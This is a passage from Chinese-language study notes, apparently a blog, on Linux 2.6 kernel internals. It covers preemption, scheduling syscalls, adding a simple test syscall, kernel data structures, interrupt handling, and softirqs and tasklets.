<p>唤醒通过 <code>wake_up()</code> 调用 <code>try_to_wake_up()</code> 实现。</p>
</li>
</ol>
<h3 id="4-4-抢占"><a href="#4-4-抢占" class="headerlink" title="4.4 抢占"></a>4.4 抢占</h3><h4 id="4-4-1-什么情况产生用户抢占"><a href="#4-4-1-什么情况产生用户抢占" class="headerlink" title="4.4.1 什么情况产生用户抢占"></a>4.4.1 什么情况产生用户抢占</h4><ol>
<li>从系统调用返回用户空间时</li>
<li>从中断处理程序返回用户空间时</li>
</ol>
<h4 id="4-4-2-什么情况发生内核抢占"><a href="#4-4-2-什么情况发生内核抢占" class="headerlink" title="4.4.2 什么情况发生内核抢占"></a>4.4.2 什么情况发生内核抢占</h4><ol>
<li>中断处理程序正在执行，且返回内核空间前</li>
<li>内核代码再次具有抢占性的时候</li>
<li>内核中的任务显示调用 <code>schedule()</code></li>
<li>内核中的任务阻塞（同样会调用 <code>schedule()</code>）</li>
</ol>
<h3 id="4-5-与调度相关的系统调用"><a href="#4-5-与调度相关的系统调用" class="headerlink" title="4.5 与调度相关的系统调用"></a>4.5 与调度相关的系统调用</h3><h4 id="4-5-1-与调度策略和优先级相关的系统调用"><a href="#4-5-1-与调度策略和优先级相关的系统调用" class="headerlink" title="4.5.1 与调度策略和优先级相关的系统调用"></a>4.5.1 与调度策略和优先级相关的系统调用</h4><div class="table-container">
<table>
<thead>
<tr>
<th>系统调用</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nice()</code></td>
<td>设置进程 nice 值</td>
</tr>
<tr>
<td><code>sched_setscheduler()</code></td>
<td>设置进程调度策略</td>
</tr>
<tr>
<td><code>sched_getscheduler()</code></td>
<td>获取..</td>
</tr>
<tr>
<td><code>sched_setparam()</code></td>
<td>设置进程实时优先级</td>
</tr>
<tr>
<td><code>sched_getparam()</code></td>
<td>获取..</td>
</tr>
<tr>
<td><code>sched_get_priority_max()</code></td>
<td>获取实时优先级最大值</td>
</tr>
<tr>
<td><code>sched_get_priority_min()</code></td>
<td>获取实时优先级最小值</td>
</tr>
<tr>
<td><code>sched_rr_get_interval()</code></td>
<td>获取进程的时间片值</td>
</tr>
</tbody>
</table>
</div>
<h4 id="4-5-2-与处理器绑定相关的系统调用"><a href="#4-5-2-与处理器绑定相关的系统调用" class="headerlink" title="4.5.2 与处理器绑定相关的系统调用"></a>4.5.2 与处理器绑定相关的系统调用</h4><div class="table-container">
<table>
<thead>
<tr>
<th>系统调用</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sched_setaffinity()</code></td>
<td>设置进程的处理器的亲和力</td>
</tr>
<tr>
<td><code>sched_getaffinity()</code></td>
<td>获取..</td>
</tr>
<tr>
<td><code>sched_yield()</code></td>
<td>暂时让出处理器</td>
</tr>
</tbody>
</table>
</div>
<h2 id="第-5-章-系统调用"><a href="#第-5-章-系统调用" class="headerlink" title="第 5 章 - 系统调用"></a>第 5 章 - 系统调用</h2><h3 id="5-1-系统调用的作用"><a href="#5-1-系统调用的作用" class="headerlink" title="5.1 系统调用的作用"></a>5.1 系统调用的作用</h3><p>系统调用相当于在用户进程和硬件设备之间加了中间层。其作用包括：</p>
<ol>
<li>为用户空间提供一种硬件的抽象接口。</li>
<li>保证系统稳定和安全。</li>
<li>为了实现多任务和虚拟内存。</li>
</ol>
<p><strong>系统调用</strong>是用户空间<font color="blue">访问内核的唯一手段</font>；除异常和陷入外，系统调用是内核的唯一合法入口。<br>Linux 中，每个系统调用都被赋予一个系统调用号，系统调用号一旦分配就不会变，内核记录了系统调用表中的所有已注册的系统调用的列表 <code>sys_call_table</code>  </p>
<h3 id="5-2-如何通知内核，自己要执行系统调用？"><a href="#5-2-如何通知内核，自己要执行系统调用？" class="headerlink" title="5.2 如何通知内核，自己要执行系统调用？"></a>5.2 如何通知内核，自己要执行系统调用？</h3><font color="blue">通知内核</font>的机制靠<font color="blue">软中断</font>实现：引发一个异常促使系统切换到内核态，然后去执行异常处理程序（此时实际上就是**系统调用处理程序 system_call()**）。

* <font face="楷体">知识点 一：如何触发软中断？</font>

<p>x86 系统预定义的软中断是<strong>中断号 128</strong> ，通过 <code>int &amp;0x80</code> 或 <code>sysenter</code> 指令触发，后者更快。</p>
<ul>
<li><font face="楷体">知识点 二：通过软中断陷入内核空间（执行系统调用处理程序）后，如何指定恰当的系统调用？</font>

</li>
</ul>
<p>x86 系统通过 <strong>eax 寄存器</strong>将<strong>系统调用号</strong>传给内核。</p>
<h3 id="5-3-系统调用的实现"><a href="#5-3-系统调用的实现" class="headerlink" title="5.3 系统调用的实现"></a>5.3 系统调用的实现</h3><p>虚构一个系统调用 <code>foo()</code> 来观察系统调用的实现步骤</p>
<ol>
<li><p>首先，把新的系统调用 <code>sys_foo()</code> 加入<font color="blue">系统调用表</font>的末尾。</p>
<p>大多数体系结构的系统调用表位于 <code>entry.s</code>，<strong>Linux 2.6 的系统调用表在 <code>linux-2.6.26/arch/x86/kernel/syscall_table_32.S</code> 中</strong></p>
<ul>
<li>查找方法及结果</li>
</ul>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;ENTRY(sys_call_table)&quot; -R .</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629173934526.png" alt="image-20210629173934526" style="zoom:80%;"></p>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629173436618.png" alt="image-20210629173436618" style="zoom:80%;"></p>
<ul>
<li>在末尾添加</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">long</span> sys_foo 			<span class="comment">/* my_sys_call */</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629174223271.png" alt="image-20210629174223271" style="zoom:80%;"></p>
<p>所以我们新添加的系统调用的调用号为 327</p>
<ol>
<li><p>把系统调用号加入 <code>asm/unistd.h</code>，<strong>Linux 2.6 对应的文件为 <code>linux-2.6.26/include/asm-x86/unistd_32.h</code></strong></p>
<ul>
<li>查找方法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;#define __NR_restart_syscall&quot; -R .</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629174858689.png" alt="image-20210629174858689" style="zoom:80%;"></p>
</li>
</ol>
<ul>
<li>在该列表中加入下面这行</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_foo		327</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629175039385.png" alt="image-20210629175039385" style="zoom:80%;"></p>
<ol>
<li><strong>实现 <code>foo()</code> 系统调用。</strong>该系统调用必须编译到核心的内核映像中，所以该例我们将其放到 <code>kernel/sys.c</code> 中。当然，如果其功能与调度相关，也可以放到 <code>kernel/sched.c</code> 中，类比书中 P66 的代码</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | grep page.h</span><br></pre></td></tr></table></figure>
<p>有</p>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629193023117.png" alt="image-20210629193023117" style="zoom:80%;"></p>
<ul>
<li>修改代码如下，将代码添加到 <code>linux-2.6.26/kernel/sys.c</code> 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm-x86/page.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回每个进程的内核栈大小</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_foo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> THREAD_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-4-从用户空间访问系统调用"><a href="#5-4-从用户空间访问系统调用" class="headerlink" title="5.4 从用户空间访问系统调用"></a>5.4 从用户空间访问系统调用</h3><p>参考 <a href="https://blog.csdn.net/pleasecallmekaige/article/details/82954775">基于ubuntu14.04下编译linux2.6内核_pleasecallmekaige的博客-CSDN博客</a></p>
<ul>
<li>编译修改后的内核代码 </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Makefile:434: *** mixed implicit and normal rules: deprecated syntax</span><br><span class="line">Makefile:1550: *** mixed implicit and normal rules: deprecated syntax</span><br><span class="line">make: *** No rule to make target &#x27;menuconfig&#x27;.  Stop.</span><br></pre></td></tr></table></figure>
<p>解决报错<a href="https://blog.csdn.net/whatday/article/details/101792006">参考</a></p>
<p>首先，将 434 行的 </p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">config %config: scripts_basic outputmakefile FORCE</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">%config %config: scripts_basic outputmakefile FORCE</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629202320129.png" alt="image-20210629202320129" style="zoom:80%;"></p>
<p>再将 1550 行的</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">/ %/: prepare scripts FORCE</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">%/: prepare scripts FORCE</span></span><br></pre></td></tr></table></figure>
<p>然后重新 <code>make menuconfig</code></p>
<ul>
<li><font face="楷体" color="pink">未完待更新</font>

</li>
</ul>
<h2 id="第-6-章-内核数据结构"><a href="#第-6-章-内核数据结构" class="headerlink" title="第 6 章 - 内核数据结构"></a>第 6 章 - 内核数据结构</h2><h3 id="6-1-链表"><a href="#6-1-链表" class="headerlink" title="6.1 链表"></a>6.1 链表</h3><p>内核链表代码在 <code>include/linux/list.h</code> （如 <code>linux-2.6.26/include/linux/list.h</code>）</p>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210630175047243.png" alt="image-20210630175047243" style="zoom:80%;"></p>
<p>内核提供了一组函数来操作链表</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>list_add(struct list_head <em>new, struct list_head </em>head);</td>
<td>在 head 后插入 new 节点</td>
</tr>
<tr>
<td>list_del(struct list_head *entry);</td>
<td>在链表中删除 entry 元素<br>注意：这个操作并不会释放 entry 或 包含 entry 的数据结构占用的内存，只是将 entry 移除链表。</td>
</tr>
<tr>
<td>list_move(struct list_head <em>list, struct list_head </em>head)</td>
<td>从一个链表中移除 list，并将其加入另一个链表的 head 节点后面</td>
</tr>
<tr>
<td>list_move_tail(struct list_head <em>list, struct list_head </em>head)</td>
<td>移到 head 前（链表的末尾）</td>
</tr>
<tr>
<td>list_empty(struct list_head *head)</td>
<td>检查链表是否为空</td>
</tr>
<tr>
<td>list_splice(struct list_head <em>list, struct list_head </em>head)</td>
<td>将 list 指向的链表插入到指定链表的 head 元素后面</td>
</tr>
<tr>
<td>list_splice_init(struct list_head <em>list, struct list_head </em>head)</td>
<td>同上，唯一区别是：由 list 指向的链表要被重新初始化</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<h3 id="6-2-队列"><a href="#6-2-队列" class="headerlink" title="6.2 队列"></a>6.2 队列</h3><p>Linux 内核通用队列实现称为 kfifo。其实现在 <code>kernel/kfifo.c</code> ，声明在 <code>include/linux/kfifo.h</code> 中。</p>
<h3 id="6-3-映射"><a href="#6-3-映射" class="headerlink" title="6.3 映射"></a>6.3 映射</h3><h3 id="6-4-红黑树"><a href="#6-4-红黑树" class="headerlink" title="6.4 红黑树"></a>6.4 红黑树</h3><h4 id="红黑树的属性"><a href="#红黑树的属性" class="headerlink" title="红黑树的属性"></a>红黑树的属性</h4><ol>
<li>所有节点非黑即红</li>
<li>叶子节点都是黑色</li>
<li>叶子节点不包含数据</li>
<li>所有非叶子节点都有两个子节点</li>
<li>如果一个节点是红色，则它的子节点都是黑色</li>
<li>在一个节点到其叶子节点的路径中，如果总包含相同数目的黑色节点，那该路径是最短的</li>
</ol>
<p>所以，<font color="blue">最深的叶子节点的深度不会大于两倍的最浅叶子节点的深度。</font></p>
<p>Linux 实现的红黑树称为 rbtree，定义在 <code>lib/rbtree.c</code> ，声明在文件 <code>include/linux/rbtree.h</code></p>
<h2 id="第-7-章-中断和中断处理"><a href="#第-7-章-中断和中断处理" class="headerlink" title="第 7 章 - 中断和中断处理"></a>第 7 章 - 中断和中断处理</h2><h3 id="7-1-中断的分类"><a href="#7-1-中断的分类" class="headerlink" title="7.1 中断的分类"></a>7.1 中断的分类</h3><ol>
<li>同步中断（也即异常）：由处理器本身产生</li>
<li>异步中断：由硬件产生</li>
</ol>
<h3 id="7-2-中断处理程序的特点"><a href="#7-2-中断处理程序的特点" class="headerlink" title="7.2 中断处理程序的特点"></a>7.2 中断处理程序的特点</h3><ul>
<li><p>中断处理程序与其他内核函数的区别？</p>
<p>中断处理程序被内核调用来响应中断，它运行在<font color="blue">中断上下文</font>（原子上下文）中，该上下文中的<strong>执行代码不可阻塞</strong>。</p>
</li>
</ul>
<h3 id="7-3-中断处理的上半部与下半部"><a href="#7-3-中断处理的上半部与下半部" class="headerlink" title="7.3 中断处理的上半部与下半部"></a>7.3 中断处理的上半部与下半部</h3><ul>
<li><p><strong>中断处理程序</strong>是<strong>上半部</strong>（top half）：接收到一个中断就立即执行，但只做有严格实现的工作（比如对接受的中断进行应答或复位硬件）。</p>
</li>
<li><p><strong>下半部</strong>是一些能够被允许稍后完成的工作。</p>
</li>
</ul>
<h3 id="7-4-注册中断处理程序"><a href="#7-4-注册中断处理程序" class="headerlink" title="7.4 注册中断处理程序"></a>7.4 注册中断处理程序</h3><ul>
<li>设备使用中断时，会发生什么？</li>
</ul>
<p>如果设备使用中断，那相应的驱动程序就通过 <code>request_irq()</code> 函数<strong>注册一个中断处理程序</strong>，并<strong>激活给定的中断线</strong>以处理中断。（该函数声明位于 <code>&lt;linux/interrupt.h&gt;</code>，具体如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* request_irq 注册函数，分配一条给定的中断线，若成功执行则返回 0</span></span><br><span class="line"><span class="comment"> * irq       - 要分配的中断号</span></span><br><span class="line"><span class="comment"> * handler   - 指向实际处理这个中断的中断处理程序的指针</span></span><br><span class="line"><span class="comment"> * flags     - 中断处理程序标志位</span></span><br><span class="line"><span class="comment"> * name      - 中断相关的设备名称 ASCII 表示</span></span><br><span class="line"><span class="comment"> * dev       - 用于共享中断线</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">request_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">irq_handler_t</span> handler,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">void</span> *dev)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>中断处理程序标志</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>标志位</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>IRQF_DISABLED</td>
<td>内核在处理中断处理程序本身期间，要禁止所有的其他中断</td>
</tr>
<tr>
<td>IRQF_SAMPLE_RANDOM</td>
<td>表明设备产生的中断对内核熵池有贡献</td>
</tr>
<tr>
<td>IRQF_TIMER</td>
<td>为系统定时器的中断处理准备的</td>
</tr>
<tr>
<td>IRQF_SHARED</td>
<td>表示可以在多个中断处理程序之间共享中断线</td>
</tr>
</tbody>
</table>
</div>
<h3 id="7-5-释放中断处理程序"><a href="#7-5-释放中断处理程序" class="headerlink" title="7.5 释放中断处理程序"></a>7.5 释放中断处理程序</h3><ul>
<li>卸载驱动程序时，需要注销相应的中断处理程序，并释放中断线。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq, <span class="keyword">void</span> *dev)</span>  <span class="comment">// 注销函数</span></span></span><br></pre></td></tr></table></figure>
<h3 id="7-6-中断上下文"><a href="#7-6-中断上下文" class="headerlink" title="7.6 中断上下文"></a>7.6 中断上下文</h3><div class="table-container">
<table>
<thead>
<tr>
<th>进程上下文</th>
<th>中断上下文</th>
</tr>
</thead>
<tbody>
<tr>
<td>可以通过 current 宏关联当前上下文</td>
<td>与 current 宏不相关（尽管它会指向被中断的进程）</td>
</tr>
<tr>
<td>可以睡眠</td>
<td>不可以睡眠</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>中断上下文有较为严格的时间限制（因为它打断了其他代码）</li>
<li>中断上下文的代码应当迅速，简洁（同上）</li>
<li>尽量把工作分离出来，放到下半部执行，因为下半部可以在更适合的时间运行</li>
</ul>
<h3 id="7-7-中断处理机制的实现（中断从硬件到内核的路由）"><a href="#7-7-中断处理机制的实现（中断从硬件到内核的路由）" class="headerlink" title="7.7 中断处理机制的实现（中断从硬件到内核的路由）"></a>7.7 中断处理机制的实现（中断从硬件到内核的路由）</h3><p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210702151130093.png" alt="image-20210702151130093"></p>
<ol>
<li>硬件产生中断，通过总线把电信号传给中断控制器</li>
<li>如果中断线是激活的，中断就会被传给处理器</li>
</ol>
<p>中断处理机制中，内核调用的函数涉及：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>do_IRQ()</td>
<td>提取中断的值，对接收的中断进行应答</td>
</tr>
<tr>
<td>handle_IRQ_event()</td>
<td>运行当前中断线所安装的中断处理程序（定义在 <code>kernel/irq/handler.c</code>）</td>
</tr>
<tr>
<td>ret_from_intr()</td>
<td>1. 如果重新调度正在被挂起，<br>&emsp;a. 且内核正在返回用户空间（即中断了用户进程），则调用 schedule()<br>&emsp;b. 且内核正在返回内核空间（即中断了内核本身），则只有在 preempt_count 为 0 时，才调用 schedule()<br>2. 未被挂起，则恢复原来的寄存器，内核恢复到曾经中断的点</td>
</tr>
</tbody>
</table>
</div>
<h4 id="拓展-procfs-虚拟文件系统"><a href="#拓展-procfs-虚拟文件系统" class="headerlink" title="拓展 - procfs 虚拟文件系统"></a>拓展 - procfs 虚拟文件系统</h4><p>procfs 只存在于内核内存，一般位于 <code>/proc</code> 目录，procfs 中读写文件都要调用内核函数。<code>/proc/interrupts</code> 存放的是系统中与中断相关的统计信息</p>
<p>具体如下图示</p>
<p>注意因为这里试验机有两个处理器，所以部分列会多一列出来</p>
<ul>
<li>第一列：中断线</li>
<li>第二列：一个接收中断数目的计数器</li>
<li>第三列：中断控制器</li>
<li>第四列：设备名</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210702152502338.png" alt="image-20210702152502338" style="zoom:80%;"></p>
<h3 id="7-8-中断控制方法"><a href="#7-8-中断控制方法" class="headerlink" title="7.8 中断控制方法"></a>7.8 中断控制方法</h3><p>可以禁止当前处理器的中断系统或屏蔽一条中断线。具体接口可以在 <code>&lt;asm/system.h&gt;</code> 和 <code>&lt;asm/irq.h&gt;</code> 找到。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>local_irq_disable()</td>
<td>禁止本地中断传递</td>
</tr>
<tr>
<td>local_irq_enable()</td>
<td>激活本地中断传递</td>
</tr>
<tr>
<td>local_irq_save()</td>
<td>保存本地中断传递的当前状态，然后禁止本地中断传递</td>
</tr>
<tr>
<td>local_irq_resotre()</td>
<td>恢复本地中断传递到给定状态</td>
</tr>
<tr>
<td>disable_irq()</td>
<td>禁止给定中断线，并确保该函数返回之前在该中断线上并没有处理程序在运行</td>
</tr>
<tr>
<td>disable_irq_nosync()</td>
<td>禁止给定中断线</td>
</tr>
<tr>
<td>enable_irq()</td>
<td>激活给定中断线</td>
</tr>
<tr>
<td>irqs_disabled()</td>
<td>本地中断传递被禁止，则返回 0；否则非 0</td>
</tr>
<tr>
<td>in_interrupt()</td>
<td>1. 在中断上下文，则返回非 0<br>2. 在进程上下文，则返回 0</td>
</tr>
<tr>
<td>in_irq()</td>
<td>1. 当前正在执行中断处理程序，返回非 0<br>2. 不在执行，返回 0</td>
</tr>
</tbody>
</table>
</div>
<h2 id="第-8-章-中断处理的下半部工作"><a href="#第-8-章-中断处理的下半部工作" class="headerlink" title="第 8 章 - 中断处理的下半部工作"></a>第 8 章 - 中断处理的下半部工作</h2><h3 id="8-1-为什么将中断处理流程分成上下两个部分？"><a href="#8-1-为什么将中断处理流程分成上下两个部分？" class="headerlink" title="8.1 为什么将中断处理流程分成上下两个部分？"></a>8.1 为什么将中断处理流程分成上下两个部分？</h3><p>因为<strong>中断处理程序</strong>本身是有<font color="blue">局限</font>的。  </p>
<ol>
<li><p><font color="blue">中断处理程序越快越好</font>  </p>
<ul>
<li>中断处理程序<strong>异步执行</strong>，有可能会打断某些重要代码，为避免被打断的代码停止时间过长，就需要中断处理程序越快越好  </li>
<li>为防止太多其他中断被屏蔽，而导致硬件与操作系统无法通信，中断处理程序需要越快越好  </li>
<li>中断处理程序往往要操作硬件，所以有很高的时限要求  </li>
</ul>
</li>
<li><p>中断处理程序不在进程上下文中运行，所以<font color="blue">不能阻塞</font>。</p>
</li>
</ol>
<p>所以，中断处理程序只能实现那些时间要求很严格的操作，其他操作就被退后到中断被激活以后再运行。  </p>
<h3 id="8-2-下半部做哪些工作？"><a href="#8-2-下半部做哪些工作？" class="headerlink" title="8.2 下半部做哪些工作？"></a>8.2 下半部做哪些工作？</h3><font color="blue">中断处理程序以外的工作</font>。那先大致捋一下**中断处理程序工作范畴**  

1. 对时间非常敏感的  

2. 跟硬件相关的  

3. 要保证不被其他中断打断的  

### 8.3 下半部的实现机制

上半部的实现机制只有一种，那就是中断处理程序。下半部的实现机制包括：  

1. <font color="blue">软中断 softirqs</font> （编译期间静态分配）  
2. <font color="blue">tasklet</font> （最常用，通过软中断实现。动态注册）  
3. <font color="blue">工作队列 work queues</font>  

<div class="table-container">
<table>
<thead>
<tr>
<th>下半部机制</th>
<th>上下文</th>
<th>顺序执行保障</th>
<th>复杂程度</th>
<th>性能</th>
</tr>
</thead>
<tbody>
<tr>
<td>软中断</td>
<td>中断</td>
<td>没有</td>
<td>高</td>
<td>好</td>
</tr>
<tr>
<td>tasklet</td>
<td>中断</td>
<td>同类型不能同时执行</td>
<td>中等</td>
<td>中等</td>
</tr>
<tr>
<td>工作队列</td>
<td>进程</td>
<td>没有（和进程上下文一样被调度）</td>
<td>简单</td>
<td>差（开销最大）</td>
</tr>
</tbody>
</table>
</div>
<h4 id="8-3-1-软中断的实现与使用"><a href="#8-3-1-软中断的实现与使用" class="headerlink" title="8.3.1 软中断的实现与使用"></a>8.3.1 软中断的实现与使用</h4><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p><code>kernel/sofrirq.c</code> 中实现  </p>
<ol>
<li>软中断处理程序 action 的函数原型：  </li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">softirq_handler</span><span class="params">(struct softirq_action *)</span></span></span><br></pre></td></tr></table></figure>
<p>一个软中断不会被另一个软中断抢占，只会被中断处理程序抢占。不过其他软中断可以在其他处理器同时执行  </p>
<ol>
<li>执行软中断  </li>
</ol>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><ol>
<li><font color="blue">分配索引</font>  

<p>内核用从 0 开始的索引表示优先级，索引值越小，优先级越高。如果想自己建立新的软中断，就要在这个表示索引的<font color="blue">枚举类型</font>中加入对应的项，由于索引值与优先级相关，所以还不能随便加，应根据优先级确定加入的位置。（这个枚举类型在 <code>&lt;linux/interrupt.h</code>）习惯上，HI_SOFTIRQ 在第一项，RCU_SOFTIRQ 在最后一项，新加入的软中断对应索引一般在 BLOCK_SOFTIRQ 和 TASKLET_SOFTIRQ 之间。  </p>
<ul>
<li>tasklet 类型列表</li>
</ul>
</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>tasklet</th>
<th>优先级</th>
<th>软中断描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>HI_SOFTIRQ</td>
<td>0</td>
<td>优先级高的 tasklets</td>
</tr>
<tr>
<td>TIMER_SOFTIRQ</td>
<td>1</td>
<td>定时器的下半部</td>
</tr>
<tr>
<td>NET_TX_SOFTIRQ</td>
<td>2</td>
<td>发送网络数据包</td>
</tr>
<tr>
<td>NET_RX_SOFTIRQ</td>
<td>3</td>
<td>接收网络数据包</td>
</tr>
<tr>
<td>BLOCK_SOFTIRQ</td>
<td>4</td>
<td>BLOCK 装置</td>
</tr>
<tr>
<td>TASKLET_SOFTIRQ</td>
<td>5</td>
<td>正常优先级的 tasklets</td>
</tr>
<tr>
<td>SCHED_SOFTIRQ</td>
<td>6</td>
<td>调度程度</td>
</tr>
<tr>
<td>HRTIMER_SOFTIRQ</td>
<td>7</td>
<td>高分辨率定时器</td>
</tr>
<tr>
<td>RCU_SOFTIRQ</td>
<td>8</td>
<td>RCU 锁定</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li><p>通过 <code>open_softirq()</code> <font color="blue">注册软中断处理程序</font>。</p>
<p>这个函数有两个参数：软中断的索引号，处理函数  </p>
</li>
<li><font color="blue">触发软中断</font>  

<p>经过枚举类型添加新项和注册，新的软中断处理程序就可以运行了。<code>raise_softirq()</code> 可以将一个软中断设置为<font color="blue">挂起</font>状态，让它下次调用 <code>do_softirq()</code> 即可投入使用。</p>
</li>
</ol>
<h4 id="8-3-2-tasklet"><a href="#8-3-2-tasklet" class="headerlink" title="8.3.2 tasklet"></a>8.3.2 tasklet</h4><h5 id="结构体及值的说明"><a href="#结构体及值的说明" class="headerlink" title="结构体及值的说明"></a>结构体及值的说明</h5><p>tasklet 由软中断实现，本质相似，但<strong>接口更简单，锁保护要求更低</strong>。  </p>
<p><strong>tasklet 结构体</strong>定义在 <code>&lt;linux/interrupt.h&gt;</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span>  <span class="comment">// 链表中的下一个 tasklet</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> state;  <span class="comment">// tasklet 状态</span></span><br><span class="line">	<span class="keyword">atomic_t</span> count;  <span class="comment">// tasklet 引用的计数武器</span></span><br><span class="line">	<span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);  <span class="comment">// tasklet 处理函数</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> data;  <span class="comment">// 给 tasklet 处理函数的参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>tasklet 状态值（state）：  </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>状态值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>未被调度</td>
</tr>
<tr>
<td>TASKLET_STATE_SCHED</td>
<td>tasklet 已调度，正准备投入运行</td>
</tr>
<tr>
<td>TASKLET_STATE_RUN</td>
<td>tasklet 正在运行</td>
</tr>
</tbody>
</table>
</div>
<p>计数器值（count）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>计数器值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>非 0</td>
<td>tasklet 被禁止，不允许执行</td>
</tr>
<tr>
<td>0</td>
<td>tasklet 被激活，并被设为挂起状态，可执行</td>
</tr>
</tbody>
</table>
</div>
<font color="blue">所有的 tasklet 都通过重复运用 HI_SOFTIRQ 和 TASKLET_SOFTIRQ 这两个软中断实现。</font>  

<p>一个 tasklet 被调度，内核就会唤醒这两个软中断中的一个  </p>
<h5 id="使用-tasklet"><a href="#使用-tasklet" class="headerlink" title="使用 tasklet"></a>使用 tasklet</h5><ol>
<li><p>声明</p>
<p>静态声明</p>
